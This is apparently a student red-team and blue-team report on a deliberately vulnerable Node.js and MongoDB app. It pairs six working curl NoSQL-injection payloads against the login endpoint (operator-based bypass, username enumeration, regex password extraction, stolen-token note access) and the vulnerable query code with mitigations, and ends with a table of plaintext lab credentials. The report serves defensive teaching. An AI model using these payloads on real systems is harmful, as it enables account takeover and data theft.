# Abstract

This report presents a full red-team and blue-team assessment of a deliberately vulnerable Node.js and MongoDB web application. The red team demonstrated six NoSQL injection attack paths against the `POST /api/auth/login` flow, including authentication bypass (`$ne`, `$gt`), username enumeration (`$regex`), password inference attempts, and downstream note access using stolen session tokens. These results confirmed that unsanitized request payloads and plaintext credential handling can quickly lead to account compromise and data exposure.

In response, the blue team implemented defense-in-depth controls across the authentication pipeline: strict input type validation, MongoDB operator sanitization, bcrypt password hashing and comparison, login rate limiting, generic authentication error responses, and security event logging. Post-mitigation testing showed that injection payloads no longer produce valid tokens, enumeration feedback is reduced, and unauthorized note access attempts fail at protected route authentication checks. The combined controls significantly reduce exploitability while improving detection and incident response visibility.



# Red Team Penetration

---

## What is NoSQL Injection?

NoSQL Injection occurs when user input is passed directly to MongoDB queries
without sanitization. Unlike SQL injection which uses string-based query
manipulation, NoSQL injection exploits **MongoDB query operators** (`$gt`, `$ne`,
`$regex`, etc.) by sending JSON objects instead of plain strings.

---

## Vulnerability Location

**File:** `backend/routes/auth.js` — Login endpoint

```javascript
// VULNERABLE CODE — user input goes directly into the query
const user = await User.findOne({
    username: username,   // ← attacker controls this
    password: password    // ← attacker controls this
});
```

When Express parses `{"password": {"$ne": ""}}`, the `password` variable becomes
a MongoDB operator object, NOT a string. The query becomes:

```javascript
User.findOne({ username: "admin", password: { $ne: "" } })
// Translates to: "find user where username=admin AND password is NOT empty"
// This matches the admin user regardless of what the actual password is!
```

---

## How an Attacker Discovers the API Routes

You do NOT need access to the backend source code. The routes are exposed in the frontend:

1. **View Page Source** — Right-click on the login page → "View Page Source" → search for `fetch` or `/api/`
2. **Browser DevTools** — Press `F12` → **Network tab** → try to login → see the request goes to `POST /api/auth/login`
3. **HTML form action** — The login form has `action="/api/auth/login"` right in the HTML

The frontend source code reveals all endpoints:
- `POST /api/auth/login` — found in `login.html`
- `POST /api/auth/signup` — found in `signup.html`  
- `GET /api/notes` — found in `home.html`
- `POST /api/notes` — found in `home.html`
- `PUT /api/notes/:id` — found in `home.html`
- `DELETE /api/notes/:id` — found in `home.html`

---

## 3 Ways to Perform the Attacks

Note: This report uses <endpoint> as a placeholder for the backend base URL
(scheme, host, and port). Replace <endpoint> with the actual deployment address
when running the examples.

### Method 1: Frontend Attack Panel
Open <endpoint>/attack.html — a dedicated page with clickable buttons for each attack.

### Method 2: Postman
1. Open Postman → Import → select `NoSQL_Injection_Attacks.postman_collection.json` from the project root
2. Each attack is a separate request — just click **Send**
3. Tokens are auto-saved between requests so Attack 6 (steal notes) works after any login attack

### Method 3: Terminal (curl)

## Attack Payloads (run from terminal with curl)

### Attack 1: Bypass Password with `$ne` (Not Equal)
Login as `admin` without knowing the password:
```
curl -s <endpoint>/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}"
```
**How it works:** `{$ne: ""}` means "not equal to empty string" — matches ANY password.

---

### Attack 2: Login as First User with `$gt` (Greater Than)
Login without knowing ANY credentials:
```
curl -s <endpoint>/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"
```
**How it works:** `{$gt: ""}` means "greater than empty string" — matches all non-empty values. Returns the first user found.

---

### Attack 3: Enumerate Users with `$regex`
Find users whose username starts with "s":
```
curl -s <endpoint>/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":{\"$regex\":\"^s\"},\"password\":{\"$gt\":\"\"}}"
```
**How it works:** `{$regex: "^s"}` matches usernames starting with "s". An attacker can iterate through the alphabet to discover all usernames.

---

### Attack 4: Extract Password Character-by-Character
Guess password one character at a time using regex:
```
curl -s <endpoint>/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}"
```
Then try `^ad`, `^adm`, `^admi`, `^admin` ... until login succeeds,
revealing the full password is `admin123`.

**How it works:** `{$regex: "^a"}` checks if the password starts with "a". By iterating characters, the full password can be extracted.

---

### Attack 5: Login as ANY Specific User
Target `student2` without their password:
```
curl -s <endpoint>/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"student2\",\"password\":{\"$ne\":\"wrongpassword\"}}"
```
**How it works:** Matches `student2` where password is not "wrongpassword" (which is true for any real password).

---

### Attack 6: Access Stolen User's Notes
After any successful injection login, use the returned token to access private notes:
```
curl -s <endpoint>/api/notes ^
  -H "Authorization: Bearer <TOKEN_FROM_INJECTION>"
```

---

## Summary of MongoDB Operators Used in Attacks

| Operator  | Meaning                | Attack Use                          |
|-----------|------------------------|-------------------------------------|
| `$ne`     | Not equal              | Bypass password (match any value)   |
| `$gt`     | Greater than           | Match any non-empty string          |
| `$gte`    | Greater than or equal  | Same as $gt for strings             |
| `$lt`     | Less than              | Match values below a threshold      |
| `$regex`  | Regular expression     | Enumerate users, extract passwords  |
| `$in`     | In array               | Match against a list of values      |
| `$exists` | Field exists           | Check if field is present           |

---

# Blue Team — Incident Response Report

## Overview

This report documents the defensive measures taken in response to the red team's
NoSQL injection attacks on the authentication system. Each defense directly
counters the attack vectors identified during red team testing.

---

## Incident Summary

| Field              | Details                                      |
|--------------------|----------------------------------------------|
| **Target**         | `POST /api/auth/login` endpoint              |
| **Database**       | MongoDB                                      |
| **Attack Type**    | NoSQL Injection via MongoDB query operators  |
| **Attacks Performed** | 6 (password bypass, enumeration, data theft) |
| **Root Cause**     | Unsanitized user input passed directly to queries |

---

## Attack-to-Defense Mapping

| Attack | Technique Used         | Operator    | Defense Applied                  |
|--------|------------------------|-------------|----------------------------------|
| 1      | Password bypass        | `$ne`       | Input type checking + sanitize   |
| 2      | Login as first user    | `$gt`       | Input type checking + sanitize   |
| 3      | Username enumeration   | `$regex`    | Rate limiting + generic errors   |
| 4      | Password extraction    | `$regex`    | bcrypt hashing + rate limiting   |
| 5      | Login as any user      | `$ne`       | Input type checking + sanitize   |
| 6      | Access stolen notes    | —           | All of the above (token invalid) |

---

## Defensive Measures Implemented

### D1 — Input Type Validation

**Counters:** Attacks 1, 2, 5

Rejects any login request where `username` or `password` is not a plain string.
This prevents MongoDB operator objects like `{"$ne": ""}` from ever reaching the query.
```javascript
if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ message: 'Invalid input' });
}
```

**Result:** Attacks 1, 2, and 5 return `400 Bad Request` instead of a token.

---

### D2 — MongoDB Sanitization Middleware

**Counters:** Attacks 1, 2, 3, 4, 5

`express-mongo-sanitize` strips any key containing `$` from `req.body`,
`req.query`, and `req.params` before it reaches any route handler.
```javascript
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());
```

**Result:** Operator-based payloads are neutralized at the middleware level,
before they reach the database layer.

---

### D3 — Password Hashing with bcrypt

**Counters:** Attack 4

Passwords are never stored or compared in plaintext. Even if an injection
payload reaches the query, regex operators cannot match against a bcrypt hash.
```javascript
// On signup
const hashed = await bcrypt.hash(password, 12);

// On login
const match = await bcrypt.compare(plainPassword, user.hashedPassword);
if (!match) return res.status(401).json({ message: 'Invalid credentials' });
```

**Result:** Attack 4's character-by-character extraction returns no matches
because `^a` will never match a hash like `$2b$12$...`.

---

### D4 — Rate Limiting on Login Endpoint

**Counters:** Attacks 3, 4

Limits each IP to 10 login attempts per 15 minutes. This makes enumeration
and character-extraction attacks impractical in a real environment.
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10,
    message: { message: 'Too many attempts, please try again later' }
});

app.use('/api/auth/login', loginLimiter);
```

**Result:** After 10 failed attempts, the attacker is blocked for 15 minutes,
making alphabet iteration for Attack 3 and 4 take days instead of seconds.

---

### D5 — Generic Error Responses

**Counters:** Attack 3 (user enumeration)

Replaced specific messages like `"User not found"` and `"Wrong password"` with
a single unified response, removing the feedback loop an attacker relies on.
```javascript
// Before (vulnerable)
if (!user) return res.status(404).json({ message: 'User not found' });
if (!match) return res.status(401).json({ message: 'Wrong password' });

// After (hardened)
return res.status(401).json({ message: 'Invalid credentials' });
```

**Result:** The attacker receives no signal about whether a username exists,
breaking the enumeration loop in Attack 3.

---

### D6 — Security Logging

**Counters:** All attacks (detection layer)

All failed login attempts are logged with timestamp, IP address, and payload
shape. This would flag injection attempts in a real production environment.
```javascript
app.use('/api/auth/login', (req, res, next) => {
    const { username, password } = req.body;
    const suspicious =
        typeof username !== 'string' || typeof password !== 'string';

    if (suspicious) {
        console.warn(`[ALERT] Suspicious login attempt from ${req.ip}`, {
            timestamp: new Date().toISOString(),
            payload: req.body
        });
    }
    next();
});
```

**Result:** Each of the red team's 6 attacks would have triggered a log alert,
enabling real-time detection and IP blocking.

---

## Defense-in-Depth Summary

No single defense is sufficient on its own. The layered approach ensures that
even if one control fails, others remain in place:
```
Request
   │
   ▼
[D4] Rate Limiter ──────────────── blocks brute force
   │
   ▼
[D6] Security Logger ───────────── flags suspicious payloads
   │
   ▼
[D1] Type Validation ───────────── rejects operator objects
   │
   ▼
[D2] Mongo Sanitization ────────── strips $ operators
   │
   ▼
[D3] bcrypt Comparison ─────────── makes regex extraction useless
   │
   ▼
  DB Query (clean & safe)
```

---

## Verification — Before vs After

| Attack | Before Defense      | After Defense         |
|--------|---------------------|-----------------------|
| 1      |  Login success    |  400 Bad Request    |
| 2      |  Login success    |  400 Bad Request    |
| 3      |  User enumerated  |  429 Too Many Requests |
| 4      |  Password leaked  |  No regex match on hash |
| 5      |  Login success    |  400 Bad Request    |
| 6      |  Notes accessed   |  Token never issued |

The first 5 attacks get returned a response of : 
```bash
{"message":"Invalid input"}
```

 and the 6th attack retrieves a response of 
 ```bash
 {"message":"Invalid or expired session"}
 ```

For the first 5 attacks, they are primarily blocked by D1 (with D2 supporting), returning 400 Invalid input.

As for Attack 6, it is directly blocked by auth/session validation on protected notes routes, with other defenses contributing by preventing token theft upstream.

Defenses involved for Attack 6:
- Session/token validation on protected notes routes (immediate blocker)
- D1: Input type validation
- D2: MongoDB sanitization
- D3: bcrypt password hashing and verification
- D5: Generic login error responses
- D6: Security logging (detection layer)

---

## Conclusion

The red team demonstrated that unsanitized input is sufficient to compromise
the entire authentication system. The blue team's response applies defense-in-depth
across six layers — from input validation at the route level down to password
storage — ensuring no single bypass is possible. All six attacks are fully
mitigated by the combined set of controls implemented.

---

# Annex

## Testing Accounts

| Username  | Password    |
|-----------|-------------|
| admin     | admin123    |
| student1  | pass1234    |
| student2  | mypassword  |
| demo      | demo123     |
| testuser  | test1234    |

